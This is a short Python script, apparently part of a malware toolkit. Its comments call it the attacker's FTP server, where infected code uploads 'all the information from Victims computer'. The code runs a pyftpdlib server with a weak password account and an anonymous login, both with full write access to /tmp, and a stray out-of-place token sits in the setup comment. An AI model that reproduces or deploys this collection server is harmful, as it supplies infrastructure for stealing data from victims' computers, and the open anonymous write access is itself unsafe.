#!/usr/bin/env python

# -*- coding: utf-8 -*-

# Created By  : Karan Ratra
# Created Date: 12/20/21
# version ='1.0'

#  ======================================================================
#  Attacker will also host a FTP Server where intected code will upload all the information from Victims computer
#  Pre requisite to run this server in your machine, please follow the steps:
#  1. Install python3
#  2. Install pip3 package manager for python3
#  3. pip3 install pyftpdlib
#       Create a directory name - ftp-uploads in your /tmp folder using the command given JAVA_OBJECT_CLASSES_LOWER
#       mkdir -p /tmp/ftp-uploads
#  ======================================================================



from pyftpdlib.authorizers import DummyAuthorizer
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.servers import FTPServer

authorizer = DummyAuthorizer()
authorizer.add_user("user", "12345", "/tmp", perm="elradfmw")
authorizer.add_anonymous("/tmp", perm="elradfmw")

handler = FTPHandler
handler.authorizer = authorizer

server = FTPServer(("127.0.0.1", 1026), handler)
server.serve_forever()